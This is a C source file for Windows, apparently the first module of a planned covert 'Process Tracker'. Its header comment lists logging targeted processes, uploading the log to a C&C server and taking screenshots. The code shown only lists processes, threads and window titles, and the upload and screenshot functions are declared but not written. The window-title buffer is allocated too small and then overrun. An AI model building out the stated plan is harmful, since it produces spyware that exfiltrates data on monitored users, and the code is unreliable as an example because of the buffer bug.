/*Module 1: Process Tracker
1. Get listing of user processes
2. Filter targeted
3. Update log file
4. Upload file to C&C
5. Get screenshot of active window
*/

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>

/*
Structure to hold retrived process details
*/
typedef struct TargetProcess
{
	CHAR user[20];
	LPCTSTR winTitle; //pointer to 0 terminated unicode string
	DATE date;
	LPCSTR processName;
}Tprocess;
/*End process structire definition*/

/*global variable*/
//processes count
DWORD procCount;

/*Function prototypes*/
BOOL addProcessToList(Tprocess process);
BOOL listProcessThreads(DWORD dwProcessId);
void addFilteredProcess(DWORD);
BOOL uploadFileEntries(void);
FILE getCurrentSS(void);
void printError(TCHAR* message);
void filterGUIThreads(DWORD threadID);
BOOL CALLBACK enumWindowsProc(HWND hWnd, LPARAM lParam);

/* Function definitions
-----------------------*/

/*Get all processes running on the system
  return success state
  */
BOOL getProcesses(void) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	
	/*
	* take a snapshot of all processes in memory
	* defined in tlhelp32.h and uses Kernel32.lib/Kernel32.dll
	* */
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		printError((TCHAR *)TEXT("Error: CreateToolhelp32Snapshot"));
		return (0);
	}

	//set size of the structure before using it
	pe32.dwSize = sizeof(PROCESSENTRY32);

	//retrieve information about the first process and exit if unsuccessful
	//the structure pe32 will contain information about each sucessive process
	if (!Process32First(hProcessSnap, &pe32)) {
		printError((TCHAR *)TEXT("Error: Process32First"));
		CloseHandle(hProcessSnap);
		return (FALSE);
	}
	//traverse the snapsvhot of processes, each time showing the process's info
	do {
		_tprintf(TEXT("\n----------------------------------------------------------------------"));
		_tprintf(TEXT("\nPROCESS NAME: %s"), pe32.szExeFile);
		_tprintf(TEXT("\n----------------------------------------------------------------------\n"));

		//retrieve the priority class
		dwPriorityClass = 0;
		//dwDesiredAcess,bInheritHandle,dwProcessId
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
		if (hProcess == NULL)
			printError(TEXT("\nOpenProcess"));
		else {
			//get current priority class of this process
			dwPriorityClass = GetPriorityClass(hProcess);
			if (!dwPriorityClass) //anything not a 0 (including -1) evaluates to true in C
				printError(TEXT("\nGetProcessClass"));
			CloseHandle(hProcess);
		}
		//process has proprity class greater than 0; 
		_tprintf(TEXT("\n Process ID = 0x%08X"), pe32.th32ProcessID);
		_tprintf(TEXT("\n Thread Count = %d"), pe32.cntThreads); //number of execution thre	ads started by the proces
		//_tprintf(TEXT("\n Parent Process ID = 0x%08X"), pe32.th32ParentProcessID); //id of the parent process
		//_tprintf(TEXT("\n Priority Base of Proceses's threads = %d"), pe32.pcPriClassBase); //base priority of any threads created by this process
		//_tprintf(TEXT("\n Executable path = %s"), pe32.szExeFile);// name of the executable file for the process

 /*Members of the PROCESSENTRY32 no longer used:
	cntUsage : always set to 0
	th32DefaultHeapId : always set to 0
	th32ModuleId : always set to 0
	dwFlags : always set to 0
	cntUsage : always set to 0
	*/
		_tprintf("\nGetting thread IDs in the process------------------->\n");
		listProcessThreads(pe32.th32ProcessID);
		//addProcess(pe32.th32ProcessID);
		procCount++;
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	return (TRUE);
}

//get all threads associated with a process.
BOOL listProcessThreads(DWORD dwProcessId) {
	BOOL done = FALSE;
	HANDLE hThreadSnapshot = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	//take a snapshot of all threads
	hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnapshot == INVALID_HANDLE_VALUE) {
		return (FALSE);
	}

	//fill in the structure before using it
	te32.dwSize = sizeof(THREADENTRY32);

	//retrieve information from the first thread and exit if unsuccessful
	if (!Thread32First(hThreadSnapshot, &te32)) {
		printError(TEXT("Thread32First"));//show cause of failure
		CloseHandle(hThreadSnapshot);
		return (FALSE);
	}

	//traverse the list of threads in current process 
	do {
		if (te32.th32OwnerProcessID == dwProcessId) {
			_tprintf(TEXT("\n Thread ID 0x%08X"),te32.th32ThreadID);
		}
	} while (Thread32Next(hThreadSnapshot, &te32));
	CloseHandle(hThreadSnapshot);
	_tprintf("\n");
	return done;
}




/*Print error message on failure*/
void printError(TCHAR* message) {
	DWORD errNum;
	TCHAR sysMessage[256];
//	TCHAR* p;

	errNum = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL,
		errNum, NULL, sysMessage, 256, NULL);
	_tprintf(TEXT("\nWarning,%s failed with error %d (%s)\n"), message, errNum, sysMessage);

}

DWORD getProcCount(void) {
	return procCount;
}

/*Callback function to enumerate all open windows*/
BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {

	int state;

	if (IsWindowVisible(hWnd)) {

	int length = GetWindowTextLength(hWnd);
	if (length == 0)return TRUE;
	printf("\nLength of window text: %d", length);

	TCHAR *buffer;
	buffer =(TCHAR*)malloc(sizeof(TCHAR)+1);
	//initialize buffer starting beggining to byte (length + 1 * sizeof(TCHAR)) with 0's (unsigned char value) 
	memset(buffer, 0, length + 1 * sizeof(TCHAR));
	state = GetWindowText(hWnd, buffer, length + 1);
	if (!state == 0) {
	printf("\nWindow Title: %s", buffer);
	}
	else
	{
		printError(TEXT("Error in printing text"));
	}
	}
	return TRUE;
}



